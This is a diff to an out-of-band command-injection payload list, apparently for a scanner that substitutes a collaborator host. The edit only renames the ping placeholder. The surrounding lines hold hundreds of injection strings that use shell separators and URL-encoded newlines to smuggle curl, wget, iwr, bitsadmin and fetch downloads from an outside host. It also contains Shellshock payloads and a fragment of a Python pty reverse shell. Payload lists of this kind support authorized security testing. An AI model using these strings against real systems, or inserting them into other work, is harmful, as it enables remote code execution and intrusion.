@@ -33,13 +33,13 @@ fetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
 fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-ping !-VARIABLE_COLLABORATOR-!&
-ping !-VARIABLE_COLLABORATOR-!&&
-ping !-VARIABLE_COLLABORATOR-!|
-ping !-VARIABLE_COLLABORATOR-!||
-ping !-VARIABLE_COLLABORATOR-!;
-ping !-VARIABLE_COLLABORATOR-!%00
-ping !-VARIABLE_COLLABORATOR-!#
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -75,13 +75,13 @@ fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
 fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-ping !-VARIABLE_COLLABORATOR-!&
-ping !-VARIABLE_COLLABORATOR-!&&
-ping !-VARIABLE_COLLABORATOR-!|
-ping !-VARIABLE_COLLABORATOR-!||
-ping !-VARIABLE_COLLABORATOR-!;
-ping !-VARIABLE_COLLABORATOR-!%00
-ping !-VARIABLE_COLLABORATOR-!#
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 \\!-VARIABLE_COLLABORATOR-!\share&
 \\!-VARIABLE_COLLABORATOR-!\share&&
 \\!-VARIABLE_COLLABORATOR-!\share|
@@ -182,13 +182,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 'fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-'ping !-VARIABLE_COLLABORATOR-!&
-'ping !-VARIABLE_COLLABORATOR-!&&
-'ping !-VARIABLE_COLLABORATOR-!|
-'ping !-VARIABLE_COLLABORATOR-!||
-'ping !-VARIABLE_COLLABORATOR-!;
-'ping !-VARIABLE_COLLABORATOR-!%00
-'ping !-VARIABLE_COLLABORATOR-!#
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 'curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -224,13 +224,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 'fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-'ping !-VARIABLE_COLLABORATOR-!&
-'ping !-VARIABLE_COLLABORATOR-!&&
-'ping !-VARIABLE_COLLABORATOR-!|
-'ping !-VARIABLE_COLLABORATOR-!||
-'ping !-VARIABLE_COLLABORATOR-!;
-'ping !-VARIABLE_COLLABORATOR-!%00
-'ping !-VARIABLE_COLLABORATOR-!#
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+'ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 '\\!-VARIABLE_COLLABORATOR-!\share&
 '\\!-VARIABLE_COLLABORATOR-!\share&&
 '\\!-VARIABLE_COLLABORATOR-!\share|
@@ -329,13 +329,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 "fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 "fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 "fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-"ping !-VARIABLE_COLLABORATOR-!&
-"ping !-VARIABLE_COLLABORATOR-!&&
-"ping !-VARIABLE_COLLABORATOR-!|
-"ping !-VARIABLE_COLLABORATOR-!||
-"ping !-VARIABLE_COLLABORATOR-!;
-"ping !-VARIABLE_COLLABORATOR-!%00
-"ping !-VARIABLE_COLLABORATOR-!#
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 "curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 "curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 "curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -371,13 +371,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 "fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 "fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 "fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-"ping !-VARIABLE_COLLABORATOR-!&
-"ping !-VARIABLE_COLLABORATOR-!&&
-"ping !-VARIABLE_COLLABORATOR-!|
-"ping !-VARIABLE_COLLABORATOR-!||
-"ping !-VARIABLE_COLLABORATOR-!;
-"ping !-VARIABLE_COLLABORATOR-!%00
-"ping !-VARIABLE_COLLABORATOR-!#
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+"ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 "\\!-VARIABLE_COLLABORATOR-!\share&
 "\\!-VARIABLE_COLLABORATOR-!\share&&
 "\\!-VARIABLE_COLLABORATOR-!\share|
@@ -476,13 +476,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 \nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 \nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 \nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-\nping !-VARIABLE_COLLABORATOR-!&
-\nping !-VARIABLE_COLLABORATOR-!&&
-\nping !-VARIABLE_COLLABORATOR-!|
-\nping !-VARIABLE_COLLABORATOR-!||
-\nping !-VARIABLE_COLLABORATOR-!;
-\nping !-VARIABLE_COLLABORATOR-!%00
-\nping !-VARIABLE_COLLABORATOR-!#
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 \ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 \ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 \ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -518,13 +518,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 \nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 \nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 \nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-\nping !-VARIABLE_COLLABORATOR-!&
-\nping !-VARIABLE_COLLABORATOR-!&&
-\nping !-VARIABLE_COLLABORATOR-!|
-\nping !-VARIABLE_COLLABORATOR-!||
-\nping !-VARIABLE_COLLABORATOR-!;
-\nping !-VARIABLE_COLLABORATOR-!%00
-\nping !-VARIABLE_COLLABORATOR-!#
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+\nping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 \n\\!-VARIABLE_COLLABORATOR-!\share&
 \n\\!-VARIABLE_COLLABORATOR-!\share&&
 \n\\!-VARIABLE_COLLABORATOR-!\share|
@@ -623,13 +623,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 %0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 %0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 %0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-%0d%0aping !-VARIABLE_COLLABORATOR-!&
-%0d%0aping !-VARIABLE_COLLABORATOR-!&&
-%0d%0aping !-VARIABLE_COLLABORATOR-!|
-%0d%0aping !-VARIABLE_COLLABORATOR-!||
-%0d%0aping !-VARIABLE_COLLABORATOR-!;
-%0d%0aping !-VARIABLE_COLLABORATOR-!%00
-%0d%0aping !-VARIABLE_COLLABORATOR-!#
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 %0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 %0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 %0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -665,13 +665,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 %0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 %0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 %0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-%0d%0aping !-VARIABLE_COLLABORATOR-!&
-%0d%0aping !-VARIABLE_COLLABORATOR-!&&
-%0d%0aping !-VARIABLE_COLLABORATOR-!|
-%0d%0aping !-VARIABLE_COLLABORATOR-!||
-%0d%0aping !-VARIABLE_COLLABORATOR-!;
-%0d%0aping !-VARIABLE_COLLABORATOR-!%00
-%0d%0aping !-VARIABLE_COLLABORATOR-!#
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+%0d%0aping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 %0d%0a\\!-VARIABLE_COLLABORATOR-!\share&
 %0d%0a\\!-VARIABLE_COLLABORATOR-!\share&&
 %0d%0a\\!-VARIABLE_COLLABORATOR-!\share|
@@ -770,13 +770,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 ;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 ;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 ;fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-;ping !-VARIABLE_COLLABORATOR-!&
-;ping !-VARIABLE_COLLABORATOR-!&&
-;ping !-VARIABLE_COLLABORATOR-!|
-;ping !-VARIABLE_COLLABORATOR-!||
-;ping !-VARIABLE_COLLABORATOR-!;
-;ping !-VARIABLE_COLLABORATOR-!%00
-;ping !-VARIABLE_COLLABORATOR-!#
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 ;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 ;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 ;curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -812,13 +812,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 ;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 ;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 ;fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-;ping !-VARIABLE_COLLABORATOR-!&
-;ping !-VARIABLE_COLLABORATOR-!&&
-;ping !-VARIABLE_COLLABORATOR-!|
-;ping !-VARIABLE_COLLABORATOR-!||
-;ping !-VARIABLE_COLLABORATOR-!;
-;ping !-VARIABLE_COLLABORATOR-!%00
-;ping !-VARIABLE_COLLABORATOR-!#
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+;ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 ;\\!-VARIABLE_COLLABORATOR-!\share&
 ;\\!-VARIABLE_COLLABORATOR-!\share&&
 ;\\!-VARIABLE_COLLABORATOR-!\share|
@@ -917,13 +917,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 |fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 |fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 |fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-|ping !-VARIABLE_COLLABORATOR-!&
-|ping !-VARIABLE_COLLABORATOR-!&&
-|ping !-VARIABLE_COLLABORATOR-!|
-|ping !-VARIABLE_COLLABORATOR-!||
-|ping !-VARIABLE_COLLABORATOR-!;
-|ping !-VARIABLE_COLLABORATOR-!%00
-|ping !-VARIABLE_COLLABORATOR-!#
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 |curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 |curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 |curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -959,13 +959,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 |fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 |fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 |fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-|ping !-VARIABLE_COLLABORATOR-!&
-|ping !-VARIABLE_COLLABORATOR-!&&
-|ping !-VARIABLE_COLLABORATOR-!|
-|ping !-VARIABLE_COLLABORATOR-!||
-|ping !-VARIABLE_COLLABORATOR-!;
-|ping !-VARIABLE_COLLABORATOR-!%00
-|ping !-VARIABLE_COLLABORATOR-!#
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+|ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 |\\!-VARIABLE_COLLABORATOR-!\share&
 |\\!-VARIABLE_COLLABORATOR-!\share&&
 |\\!-VARIABLE_COLLABORATOR-!\share|
@@ -1064,13 +1064,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 ||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 ||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 ||fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-||ping !-VARIABLE_COLLABORATOR-!&
-||ping !-VARIABLE_COLLABORATOR-!&&
-||ping !-VARIABLE_COLLABORATOR-!|
-||ping !-VARIABLE_COLLABORATOR-!||
-||ping !-VARIABLE_COLLABORATOR-!;
-||ping !-VARIABLE_COLLABORATOR-!%00
-||ping !-VARIABLE_COLLABORATOR-!#
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 ||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 ||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 ||curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -1106,13 +1106,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 ||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 ||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 ||fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-||ping !-VARIABLE_COLLABORATOR-!&
-||ping !-VARIABLE_COLLABORATOR-!&&
-||ping !-VARIABLE_COLLABORATOR-!|
-||ping !-VARIABLE_COLLABORATOR-!||
-||ping !-VARIABLE_COLLABORATOR-!;
-||ping !-VARIABLE_COLLABORATOR-!%00
-||ping !-VARIABLE_COLLABORATOR-!#
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+||ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 ||\\!-VARIABLE_COLLABORATOR-!\share&
 ||\\!-VARIABLE_COLLABORATOR-!\share&&
 ||\\!-VARIABLE_COLLABORATOR-!\share|
@@ -1211,13 +1211,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 &fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 &fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 &fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-&ping !-VARIABLE_COLLABORATOR-!&
-&ping !-VARIABLE_COLLABORATOR-!&&
-&ping !-VARIABLE_COLLABORATOR-!|
-&ping !-VARIABLE_COLLABORATOR-!||
-&ping !-VARIABLE_COLLABORATOR-!;
-&ping !-VARIABLE_COLLABORATOR-!%00
-&ping !-VARIABLE_COLLABORATOR-!#
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 &curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 &curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 &curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -1253,13 +1253,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 &fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 &fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 &fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-&ping !-VARIABLE_COLLABORATOR-!&
-&ping !-VARIABLE_COLLABORATOR-!&&
-&ping !-VARIABLE_COLLABORATOR-!|
-&ping !-VARIABLE_COLLABORATOR-!||
-&ping !-VARIABLE_COLLABORATOR-!;
-&ping !-VARIABLE_COLLABORATOR-!%00
-&ping !-VARIABLE_COLLABORATOR-!#
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 &\\!-VARIABLE_COLLABORATOR-!\share&
 &\\!-VARIABLE_COLLABORATOR-!\share&&
 &\\!-VARIABLE_COLLABORATOR-!\share|
@@ -1358,13 +1358,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 &&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
 &&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
 &&fetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
-&&ping !-VARIABLE_COLLABORATOR-!&
-&&ping !-VARIABLE_COLLABORATOR-!&&
-&&ping !-VARIABLE_COLLABORATOR-!|
-&&ping !-VARIABLE_COLLABORATOR-!||
-&&ping !-VARIABLE_COLLABORATOR-!;
-&&ping !-VARIABLE_COLLABORATOR-!%00
-&&ping !-VARIABLE_COLLABORATOR-!#
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 &&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
 &&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
 &&curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
@@ -1400,13 +1400,13 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 &&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
 &&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
 &&fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
-&&ping !-VARIABLE_COLLABORATOR-!&
-&&ping !-VARIABLE_COLLABORATOR-!&&
-&&ping !-VARIABLE_COLLABORATOR-!|
-&&ping !-VARIABLE_COLLABORATOR-!||
-&&ping !-VARIABLE_COLLABORATOR-!;
-&&ping !-VARIABLE_COLLABORATOR-!%00
-&&ping !-VARIABLE_COLLABORATOR-!#
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&&
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!|
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!||
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!;
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%00
+&&ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!#
 &&\\!-VARIABLE_COLLABORATOR-!\share&
 &&\\!-VARIABLE_COLLABORATOR-!\share&&
 &&\\!-VARIABLE_COLLABORATOR-!\share|
@@ -1475,13 +1475,13 @@ wget !-VARIABLE_COLLABORATOR-!/rce_curl.txt
 iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt
 bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt
 fetch !-VARIABLE_COLLABORATOR-!/fetch.txt
-ping !-VARIABLE_COLLABORATOR-!
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 curl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt
 wget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt
 iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt
 bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt
 fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt
-ping !-VARIABLE_COLLABORATOR-!
+ping !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!
 \\!-VARIABLE_COLLABORATOR-!\share
 () { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt
 () { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt
@@ -1496,122 +1496,122 @@ import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80
 `iwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt`
 `bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt`
 `fetch !-VARIABLE_COLLABORATOR-!/fetch.txt`
